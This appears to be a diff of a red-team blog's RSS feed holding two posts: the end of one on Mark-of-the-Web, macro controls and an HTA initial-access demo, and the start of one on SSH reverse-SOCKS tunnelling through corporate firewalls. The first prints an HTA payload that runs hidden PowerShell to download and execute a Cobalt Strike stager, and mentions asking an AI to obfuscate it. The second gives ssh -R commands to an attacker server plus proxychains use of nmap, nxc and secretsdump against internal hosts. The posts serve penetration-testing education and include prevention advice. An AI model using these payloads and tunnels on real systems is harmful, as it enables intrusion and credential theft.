+&lt;h3&gt;Mark-Of-The-Web (MOTW)&lt;span class=&#34;absolute -mt-20&#34; id=&#34;mark-of-the-web-motw&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#mark-of-the-web-motw&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;Mark-of-the-Web (MOTW) is a security feature originally introduced in Internet Explorer to ensure that saved web pages and other downloaded files run in the security zone corresponding to their origin. It was accomplished by appending to saved webpages and was later extended to support other file types using Alternate Data  Streams (ADS), which is a feature of NTFS file system that dates back to Windows 3.1.&lt;/p&gt;
+&lt;p&gt;This feature allows files to have multiple data streams associated with them, by using the &lt;code&gt;|filename:streamname&lt;/code&gt; format. It also applies to MS Office, and other programs by utilising &lt;code&gt;|AttachmentExecuteInterface&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;So when we have downloaded the file, Internet Explorer creates an ADS named &lt;code&gt;Zone.Identifier&lt;/code&gt; and adds a &lt;code&gt;ZoneID&lt;/code&gt; to the stream in order to indicate a zone that file comes from.&lt;/p&gt;
+&lt;p&gt;In ADS, we have the following ZoneID values and their representations:&lt;/p&gt;
+&lt;ol start=&#34;0&#34;&gt;
+&lt;li&gt;Local computer&lt;/li&gt;
+&lt;li&gt;Local intranet&lt;/li&gt;
+&lt;li&gt;Trusted sites&lt;/li&gt;
+&lt;li&gt;Internet&lt;/li&gt;
+&lt;li&gt;Restricted sites&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;&lt;figure&gt;
+    &lt;img src=&#34;images/image123.png&#34; title=&#34;image123&#34; alt=&#34;image123&#34; loading=&#34;lazy&#34; /&gt;
+    &lt;figcaption&gt;image123&lt;/figcaption&gt;
+  &lt;/figure&gt; Figure 5: ADS created on downloaded file.&lt;/p&gt;
+&lt;p&gt;As we can see in the figure above, all modern Windows platforms that are dealing with downloaded files or attachments will generate a &lt;code&gt;Zone.Identifier&lt;/code&gt; in ADS stream, adding URL information such as Referrer and Host information in addition to the zone. This information can be used to enhance antivirus and various endpoint detection and response (EDR) products to aid the reputation checks of the file.&lt;/p&gt;
+&lt;p&gt;Mark-of-the-Web (MotW) nowadays serves as a barrier to successful phishing attacks by giving users the option to decline execution. It also collaborates with SmartScreen, enabling access to the registered antivirus engine to perform additional checks on signatures and reputation. Nevertheless, adversaries can circumvent these protections as they might deliver a phishing attachment that evades supplementary prompts or inspections.&lt;/p&gt;
+&lt;p&gt;Alternatively, they could create a malicious extension that closely resembles legitimate content, tricking victims into inadvertently providing initial access.&lt;/p&gt;
+&lt;h3&gt;Office Security Controls&lt;span class=&#34;absolute -mt-20&#34; id=&#34;office-security-controls&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#office-security-controls&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;&lt;figure&gt;
+    &lt;img src=&#34;images/image10.png&#34; title=&#34;image10&#34; alt=&#34;image10&#34; loading=&#34;lazy&#34; /&gt;
+    &lt;figcaption&gt;image10&lt;/figcaption&gt;
+  &lt;/figure&gt; Figure 6: Macro security controls.&lt;/p&gt;
+&lt;p&gt;Macros have been a favoured initial access method for threat actors since the early days, persisting as one of the longest-enduring challenges in the industry. One notable event was usage of the macro in the &lt;a href=&#34;https://www.acronis.com/en-gb/cyber-protection-center/posts/vawtrak-a-banking-trojan-with-a-long-history/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Vawtrak&lt;/a&gt; malware campaign, discovered in 2014 and was used to spread and steal credentials in the Bank of America attack. Microsoft is trying to battle macro malware by enforcing Mark-of-the-Web (MotW) control on macro-enabled documents. Microsoft’s &lt;a href=&#34;https://learn.microsoft.com/en-us/deployoffice/security/internet-macros-blocked&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;documentation&lt;/a&gt; states:&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;VBA macros are a common way for malicious actors to gain access to deploy malware and ransomware. Therefore, to help improve security in Office, we’re changing the default behavior of Office applications to block macros in files from the internet.&lt;/p&gt;&lt;/blockquote&gt;
+&lt;p&gt;Blocking macros serves a dual purpose: it reduces the potential for attacks and raises the complexity needed to execute them, especially since email remains the primary method for delivering malware.&lt;/p&gt;
+&lt;p&gt;&lt;figure&gt;
+    &lt;img src=&#34;images/image2.png&#34; title=&#34;image2&#34; alt=&#34;image2&#34; loading=&#34;lazy&#34; /&gt;
+    &lt;figcaption&gt;image2&lt;/figcaption&gt;
+  &lt;/figure&gt; Figure 7: Upon document execution a macro popup will appear.&lt;/p&gt;
+&lt;p&gt;Therefore, we can assert that the threat landscape can be divided into Pre-Macro and Post-Macro eras, as threat actors have swiftly adapted by moving away from macro-based malware to utilising utilities such as OneNote files with .one and .onepkg extensions. This shift has been identified by security researchers as a significant evolution in the email threat landscape in recent history. With that in mind, the following section of the post will introduce different techniques that adversaries are employing in order to facilitate initial access and bypass previously mentioned security measures.&lt;/p&gt;
+&lt;h2&gt;Initial Access Demo&lt;span class=&#34;absolute -mt-20&#34; id=&#34;initial-access-demo&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#initial-access-demo&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;To achieve initial access, adversaries often require some form of user interaction to execute their kill-chain. For this blog post, let&amp;rsquo;s assume that we are the end-user who has received an email link that successfully bypassed email filters (for more on this, see our blog post on automated smuggling techniques by our red team operator &lt;a href=&#34;https://labs.jumpsec.com/wasm-smuggling-for-initial-access-and-w-a-l-k-tool-release/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Francesco&lt;/a&gt;). Alternatively, we could have been coerced by an adversary through SaaS applications like Teams (for details on this method, refer to &lt;a href=&#34;https://labs.jumpsec.com/advisory-idor-in-microsoft-teams-allows-for-external-tenants-to-introduce-malware/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Max&lt;/a&gt;’s IDOR discovery) to download a binary file.&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Please note, that in this demo, Microsoft Defender was turned off, although normally during engagements, antivirus/EDR bypassing is another process that is undertaken by operators.&lt;/p&gt;&lt;/blockquote&gt;
+&lt;p&gt;In this blog post, we are going to use malicious HTA payloads that are being used by adversaries. HTA (HTML Application) is basically an application whose source consists of HTML, Dynamic HTML, and one or more scripting languages supported by Internet Explorer, such as VBScript or JScript. One caveat with this technique is that it requires Internet Explorer to be installed, otherwise HTA files won&amp;rsquo;t execute on the target computer. It&amp;rsquo;s worth noting that it also runs in &lt;strong&gt;full trust mode&lt;/strong&gt; therefore browser security constraints do not apply here.&lt;/p&gt;
+&lt;p&gt;During execution, it uses mshta.exe which native Windows binary that suits perfectly for modern living of the land ethos and handles further malicious code execution without needing to touch the victims disk. LOLBINS are commonly used by adversaries to execute malicious code and evade EDR/AV solutions as those native binaries are often not picked up given they are used for legitimate sysadmin tasks.&lt;/p&gt;
+&lt;p&gt;To proceed, we are going to use Cobalt Strike, set up teamserver infrastructure with listeners and use Scripted Web Delivery that will generate stageless beacon payload artefacts that will be handled by our malicious HTA application.&lt;/p&gt;
+&lt;p&gt;&lt;figure&gt;
+    &lt;img src=&#34;images/image1.png&#34; title=&#34;image1&#34; alt=&#34;image1&#34; loading=&#34;lazy&#34; /&gt;
+    &lt;figcaption&gt;image1&lt;/figcaption&gt;
+  &lt;/figure&gt; Figure 8: Configuring a Cobalt Strike Listener and Scripted Web Delivery of our payload.&lt;/p&gt;
+&lt;p&gt;After that, with truly modern fashion, we are going to politely ask our AI friend to obfuscate it so we can test it out of curiosity against static analysis detection to see how it withstands AV/EDR solutions.&lt;/p&gt;
+&lt;p&gt;&lt;figure&gt;
+    &lt;img src=&#34;images/image9.png&#34; title=&#34;image9&#34; alt=&#34;image9&#34; loading=&#34;lazy&#34; /&gt;
+    &lt;figcaption&gt;image9&lt;/figcaption&gt;
+  &lt;/figure&gt; Figure 9: Prompt that was used to obfuscate our PowerShell command for our .hta payload&lt;/p&gt;
+&lt;p&gt;Let&amp;rsquo;s compare static analysis detection rates with the non-obfuscated payload, for this we are going to utilise hybrid analysis. This is an excerpt of an example HTA payload below:&lt;/p&gt;
+&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;&amp;lt;html&amp;gt;  
+&amp;lt;head&amp;gt;
+&amp;lt;title&amp;gt;HTA Payload Demo&amp;lt;/title&amp;gt;
+&amp;lt;/head&amp;gt;  
+&amp;lt;body&amp;gt;  
+&amp;lt;p&amp;gt;Example Text&amp;lt;/p&amp;gt;  
+&amp;lt;/body&amp;gt;  
+
+&amp;lt;script language=&amp;#34;VBScript&amp;#34;&amp;gt;  
+Function demo()  
+Set shell = CreateObject(&amp;#34;wscript.Shell&amp;#34;)  
+shell.run &amp;#34;powershell.exe -nop -w hidden -c &amp;#34;IEX ((new-object net.webclient).downloadstring(&amp;#39;http://192.168.0.7:8088/a&amp;#39;))&amp;#34;&amp;#34;  
+End Function  
+
+demo  
+&amp;lt;/script&amp;gt;  
+&amp;lt;/html&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
+    &lt;button
+      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
+      title=&#34;Copy code&#34;
+    &gt;
+      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
+      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
+    &lt;/button&gt;
+  &lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt; &lt;/p&gt;
+&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
+    &lt;button
+      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
+      title=&#34;Copy code&#34;
+    &gt;
+      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
+      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
+    &lt;/button&gt;
+  &lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;As we can see in the figure above, we can conclude that with little effort, adversaries can increase their sophistication and attempt to evade some of the detections. In our case we don&amp;rsquo;t need to worry about the AV/EDRs as for demo purposes, we have disabled Windows Defender. But evasion is integrated within the red team craft where we have to tackle each phase of EDR/AV detection, those phases include: Static and Heuristic Analysis, Cloud Reputation Analysis, Sandboxing , Machine Learning Analysis, Emulation and Behavioural Analysis.&lt;/p&gt;
+&lt;p&gt;For this reason, there are different cyber kill chains, where in order to evade detection of our HTA payload, we could perhaps use ISO containerisation techniques that would evade Mark-of-the-Web, then use HTML smuggling to fly past phishing detections. Then we could utilise a LNK technique, to trick the end-user into clicking our executable that has fully customised shellcode which is additionally loaded using DLL sideloading of legitimate running process. This just shows how complex implementing new undetectable payloads could be, and how many layers of defences have to be taken into consideration.&lt;/p&gt;
+&lt;p&gt;Back to our initial access demo, now that we have our HTA application on the target machine, let&amp;rsquo;s execute it. What will happen in the background is that our powershell code embedded within that HTA application will fetch our Cobalt Strike stager hosted on our teamserver.&lt;/p&gt;
+&lt;p&gt;&lt;figure&gt;
+    &lt;img src=&#34;images/image6.png&#34; title=&#34;image6&#34; alt=&#34;image6&#34; loading=&#34;lazy&#34; /&gt;
+    &lt;figcaption&gt;image6&lt;/figcaption&gt;
+  &lt;/figure&gt; Figure 11: Execution of the .hta payload and visible .mshta as “HTML Application Host”&lt;/p&gt;
+&lt;p&gt;&lt;figure&gt;
+    &lt;img src=&#34;images/image11.png&#34; title=&#34;image11&#34; alt=&#34;image11&#34; loading=&#34;lazy&#34; /&gt;
+    &lt;figcaption&gt;image11&lt;/figcaption&gt;
+  &lt;/figure&gt; Figure 12: Connection was established as can be seen by our beacon that was executed via the HTA payload.&lt;/p&gt;
+&lt;p&gt;As demonstrated in the figure above, we have successfully established a connection to our victims&amp;rsquo; host. From this point forward, we can interact with the beacon, marking just the beginning of our red team engagement. The real challenge lies ahead as we delve into persistence, privilege escalation, lateral movement, and pivoting all of which are significant undertakings given the capabilities of current EDR and AV solutions to emulate real-world adversaries and their techniques.&lt;/p&gt;
+&lt;h2&gt;Initial Access Prevention Strategies&lt;span class=&#34;absolute -mt-20&#34; id=&#34;initial-access-prevention-strategies&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#initial-access-prevention-strategies&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;There are several prevention strategies we recommend implementing, as there is no one-size-fits-all solution due to factors such as complex infrastructure setups, data collection and correlation challenges.&lt;/p&gt;
+&lt;p&gt;However, we have found that having a robust AV/EDR solution, along with effective patch management, by keeping machines patched and up-to-date against n-day exploits is crucial. Additionally, tightening group policies makes it more difficult for adversaries to navigate and pivot within the network, thereby containing the threat and minimising the &amp;ldquo;blast radius.&amp;rdquo; Implementing email filters with appropriate thresholds and spam rules is also highly recommended, complementing secure mail configurations for protocols like IMAP, SMTP, or POP.&lt;/p&gt;
+&lt;p&gt;Furthermore, protecting SaaS applications such as Teams, SharePoint, Exchange Online, or OneDrive through regular configuration reviews is crucial, as these platforms are often targeted for initial access.&lt;/p&gt;
+&lt;p&gt;Thank you for taking the time to read this blog. I hope you found it informative and enjoyable. Stay tuned for more of our upcoming blog posts and advisories.&lt;/p&gt;
+&lt;h2&gt;References&lt;span class=&#34;absolute -mt-20&#34; id=&#34;references&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#references&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;https://www.gironsec.com/blog/2020/12/bypassing-windows-smartscreen/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://www.gironsec.com/blog/2020/12/bypassing-windows-smartscreen/&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://redcanary.com/threat-detection-report/techniques/mark-of-the-web-bypass/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://redcanary.com/threat-detection-report/techniques/mark-of-the-web-bypass/&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://mgeeky.tech/warcon-2022-modern-initial-access-and-evasion-tactics/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://mgeeky.tech/warcon-2022-modern-initial-access-and-evasion-tactics/&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://www.gov.uk/government/statistics/cyber-security-breaches-survey-2024/cyber-security-breaches-survey-2024&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://www.gov.uk/government/statistics/cyber-security-breaches-survey-2024/cyber-security-breaches-survey-2024&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://www.techradar.com/pro/security/microsoft-smartscreen-vulnerability-can-be-abused-to-deploy-malware-and-its-happening-in-the-wild&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://www.techradar.com/pro/security/microsoft-smartscreen-vulnerability-can-be-abused-to-deploy-malware-and-its-happening-in-the-wild&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://v3ded.github.io/redteam/abusing-lnk-features-for-initial-access-and-persistence&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://v3ded.github.io/redteam/abusing-lnk-features-for-initial-access-and-persistence&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+      </description>
+    </item>
+    
+    <item>
+      <title>SSH Tunnelling to Punch Through Corporate Firewalls - Updated take on one of the oldest LOLBINs</title>
+      <link>//localhost:1313/articles/2024/08/2024-08-13-ssh-tunnelling-to-punch-through-corporate-firewalls-updated-take-on-one-of-the-oldest-lolbins/</link>
+      <pubDate>Tue, 13 Aug 2024 00:00:00 +0000</pubDate>
+      
+      <guid>//localhost:1313/articles/2024/08/2024-08-13-ssh-tunnelling-to-punch-through-corporate-firewalls-updated-take-on-one-of-the-oldest-lolbins/</guid>
+      <description>
+        
+        
+        &lt;p&gt;&lt;figure&gt;
+    &lt;img src=&#34;images/ezgif-7-4b7e7cf968.gif&#34; title=&#34;ezgif 7 4b7e7cf968&#34; alt=&#34;ezgif 7 4b7e7cf968&#34; loading=&#34;lazy&#34; /&gt;
+    &lt;figcaption&gt;ezgif 7 4b7e7cf968&lt;/figcaption&gt;
+  &lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;In my formative days of learning network hacking, SSH tunnelling was amongst the first tunnelling techniques that I learnt. I still remember trying to repeatedly decode my notes and diagrams on the rather cumbersome syntax of single port forwarding with the -L and -R flags, which at the time was taught as “the way to do it”. If your foothold is (luckily) a Linux server, then you’re blessed with the -D flag to spin up a SOCKS proxy on the foothold itself to access the network via proxychains.&lt;/p&gt;
+&lt;p&gt;Fast forward a few years later, in our day-to-day work, be it network pentest or adversary simulation, I’ve found my colleagues and I using good ol’ SSH tunnelling in real engagements not less, but more.&lt;/p&gt;
+&lt;p&gt;Quoting what Andy Gill &lt;a href=&#34;https://github.com/ZephrFish&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;@ZephrFish&lt;/a&gt; said in SteelCon 2024 a couple of weeks ago:&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;em&gt;“F*** C2 frameworks, a tunnel is all you need.”&lt;/em&gt;&lt;/p&gt;&lt;/blockquote&gt;
+&lt;p&gt;While I might not feel this as strongly as Andy does, there is more than a pinch of truth in that statement. A good tunnel can often be everything you wanted to execute from the end user laptop. And yet, a Google search “SSH tunnelling in pentesting” and “…in red team engagements”, would see most top results still described the “old” way of punching single port-sized holes with -R and -L, or local dynamic SOCKS with -D, which is actually not at all how we used SSH in our engagements. There are a couple of recent blog posts (linked below) published within the recent 1-2 years describing SSH tunnelling using the Reverse dynamic proxy and their unique spins on it, so I’ll avoid as much overlap content as I can and present our tips and tricks about SSH tunnelling, with a focus on getting through firewalls.&lt;/p&gt;
+&lt;p&gt; &lt;/p&gt;
+&lt;p&gt;SSH tunnelling is of course not our primary nor sole way to tunnel out of a client’s network (&lt;a href=&#34;https://labs.jumpsec.com/ligolo-quality-of-life-on-red-team-engagements/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;wink wink&lt;/a&gt;), but whenever I am in a pinch, and nothing else works, this little tool has served me oh-so-well.&lt;/p&gt;
+&lt;p&gt;Shoutout to recent blog posts describing similar flavors of the SSH tunnelling technique:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;https://www.pentestpartners.com/security-blog/living-off-the-land-with-native-ssh-and-split-tunnelling/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Living off the land with native SSH and split tunnelling&lt;/a&gt; - by PTP’s Joe Blogs in Mar 2024, a concise summary of the fundamental form of this technique&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://redsiege.com/blog/2024/04/sshishing-abusing-shortcut-files-and-the-windows-ssh-client-for-initial-access/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;SSHishing – Abusing Shortcut Files and the Windows SSH Client for Initial Access&lt;/a&gt; - by Red Siege’s Alex Reid in Apr 2024 going over the interesting take on using Lnk files to turn the SSH tunnelling command into a phishing payload&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://trustedsec.com/blog/the-socks-we-have-at-home&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;The SOCKS we have at Home&lt;/a&gt; - by TRUSTEDSEC’s Esteban Rodriguez in Oct 2023 detailing creation of a limtedaccess user on the remote server for better Opsec&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt; &lt;/p&gt;
+&lt;h2&gt;Let’s cut to the chase&lt;span class=&#34;absolute -mt-20&#34; id=&#34;lets-cut-to-the-chase&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#lets-cut-to-the-chase&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;The OpenSSH client is natively available in almost all Windows machines with an OS / Service Pack later than early 2018, more specifically Win10 v1709 and Win Server v1803. (To the Windows sysadmin reading this, you don’t have to use Putty anymore!)&lt;/p&gt;
+&lt;p&gt;Furthermore, the stars were so aligned in 2017 that, right before Microsoft ported OpenSSH to Windows, the OpenSSH project implemented the reverse dynamic proxy feature, a bit obscurely (if you ask me!) reusing the -R flag &lt;a href=&#34;https://www.openssh.com/txt/release-7.6&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;in version 7.6&lt;/a&gt;. (This has been explained in the ChangeLog for 7 years but yet not many people are talking about this, which shows that RTFM does, in fact, often pay off.)&lt;/p&gt;
+&lt;p&gt;In 2024, corporate laptops or workstations are almost universally on either Windows 10 or 11, and that means the ssh command is, on most pentesting or adversarial gigs, sitting in the PATH of the client’s machine without needing us to install or enable anything extra.&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;em&gt;To make this as unambiguous as I can - the &lt;strong&gt;native&lt;/strong&gt; ssh command on Windows 10/11 devices has been allowing anyone to start a reverse &amp;amp; dynamic SOCKS proxy into any internal network since 2017! And that makes it possible to run tools like Impacket scripts, Netexec (formerly Crackmapexec) or Certipy natively behind the SOCKS proxy on a remote Linux server, while to the defender the traffic appears to originate from the compromised machine.&lt;/em&gt;&lt;/p&gt;&lt;/blockquote&gt;
+&lt;p&gt; &lt;/p&gt;
+&lt;p&gt;And in 2024, many corporate firewalls still allow SSH outbound from workstations, or are configured in such a way that it is relatively trivial to bypass, and blue teams are often not watching ssh being executed because of how much of a LOLBIN it is.&lt;/p&gt;
+&lt;h2&gt;3 Tricks to punch through Corporate firewalls&lt;span class=&#34;absolute -mt-20&#34; id=&#34;3-tricks-to-punch-through-corporate-firewalls&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#3-tricks-to-punch-through-corporate-firewalls&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;h3&gt;1. Basic form: -R&lt;span class=&#34;absolute -mt-20&#34; id=&#34;1-basic-form--r&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#1-basic-form--r&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;On the compromised Windows or Nix machine, run SSH with either the binary&amp;rsquo;s name:&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;ssh -R PROXY_PORT user@attacker_server.com&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
+    &lt;button
+      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
+      title=&#34;Copy code&#34;
+    &gt;
+      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
+      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
+    &lt;/button&gt;
+  &lt;/div&gt;
+&lt;/div&gt;&lt;/blockquote&gt;
+&lt;p&gt;Or use the full path, on for example port 8888&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;C:\Windows\System32\OpenSSH\ssh.exe -R 8888 user@attacker_server.com&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
+    &lt;button
+      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
+      title=&#34;Copy code&#34;
+    &gt;
+      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
+      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
+    &lt;/button&gt;
+  &lt;/div&gt;
+&lt;/div&gt;&lt;/blockquote&gt;
+&lt;p&gt;&lt;em&gt;On assumed breach gigs we have a quick trick to check whether outbound SSH is allowed which I will elaborate in the next section.&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;&lt;figure&gt;
+    &lt;img src=&#34;images/screenshot1.png&#34; title=&#34;screenshot1&#34; alt=&#34;ssh_screenshot1&#34; loading=&#34;lazy&#34; /&gt;
+    &lt;figcaption&gt;screenshot1&lt;/figcaption&gt;
+  &lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;Here we assume you have a VPS with a static IP / DNS record pointing to the VPS, on the internet. If you so choose to use password authentication, do set up IP allowlisting on your client’s and your own egress IP only to avoid being brute-forced. Then on your VPS / attacking server, set up /etc/proxychains.conf as usual. Specifying the remote server’s proxychains.conf to use SOCKS5 would enable the additional compatibility of UDP and thus DNS lookups through the tunnel as well:&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;socks5 	127.0.0.1 8888&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
+    &lt;button
+      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
+      title=&#34;Copy code&#34;
+    &gt;
+      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
+      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
+    &lt;/button&gt;
+  &lt;/div&gt;
+&lt;/div&gt;&lt;/blockquote&gt;
+&lt;p&gt;Then you could run your commands on the attacking box with proxychains:&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;proxychains nmap -sT -F internal_target_ip
+proxychains nxc smb internal_target_ip -u USER -p PASSWD --shares
+proxychains secretsdump.py ... and so on&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
+    &lt;button
+      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
+      title=&#34;Copy code&#34;
+    &gt;
+      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
+      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
+    &lt;/button&gt;
+  &lt;/div&gt;
+&lt;/div&gt;&lt;/blockquote&gt;
